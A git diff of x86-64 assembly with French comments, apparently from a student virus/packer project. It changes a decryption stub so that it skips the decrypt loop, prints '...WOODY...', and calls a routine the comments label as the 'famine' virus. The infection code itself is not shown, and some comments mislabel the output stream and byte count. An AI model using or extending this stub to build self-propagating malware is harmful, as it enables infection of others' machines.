@@ -44,10 +44,11 @@ _start:
     push    r8
 
 	;si je suis l'original
-	; jmp end_decrypt
+	jmp NEAR end_decrypt
+    ; 0x55555555a1cc
 
     xor r15, r15
-    sub rsp, 8                    ; Réserver 8 octets sur la pile pour `block`
+    ; sub rsp, 8                    ; Réserver 8 octets sur la pile pour `block`
 	; debut = lea r8, [rel famine]
 	; lea r8, [rel famine]
 	;va load l'addresse du debut de la fonction famine (virus)
@@ -113,14 +114,30 @@ reverse_rounds:
     ; Recomposer le bloc déchiffré
     shl r13, 32                   ; Décaler right pour le positionner dans la moitié haute
     or r14, r13                   ; Fusionner left et right
-    mov [rsp], r14                ; Stocker le bloc déchiffré dans `block` (pile)
+    ; mov [rsp], r14                ; Stocker le bloc déchiffré dans `block` (pile)
 
 display_decrypted_block:
-    mov rdi, 1                    ; stdout
-    lea rsi, [rsp]                ; Adresse du bloc sur la pile
-    mov rdx, 8                    ; Taille du bloc (8 octets)
-    mov rax, 1                    ; syscall write
-    syscall
+    ; mov rdi, 1                    ; stdout
+    ; ; lea rsi, [rsp]                ; Adresse du bloc sur la pile
+    ; mov rdx, 8                    ; Taille du bloc (8 octets)
+    ; mov rax, 1                    ; syscall write
+    ; syscall
+
+    push	0x0a2e2e2e	;	...\n
+	push	0x59444f4f	;	OODY
+	push	0x572e2e2e	;	...W
+
+	;	write(stderr, "...WOODY...\n", 20)
+	mov		rax, 1		;	syscall number
+	mov		rdi, 1		;	stderr
+	mov		rsi, rsp	;	"...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
+	mov		rdx, 20		;	20
+	syscall
+
+	;	Clear la stack pour pas avoir de problemes
+	pop	rax
+	pop	rax
+	pop	rax
     
     ; Passer au bloc suivant
     add r15, 8                    ; Avancer l'index de 8 bytes
@@ -130,9 +147,9 @@ display_decrypted_block:
 	
 
 end_decrypt:
+	; add rsp, 8
 	call	famine	
 
-	add rsp, 8
 
     pop     r8
     pop     r9
@@ -159,4 +176,3 @@ end_decrypt:
 
 
 section .note.GNU-stack noalloc noexec nowrite progbits
-
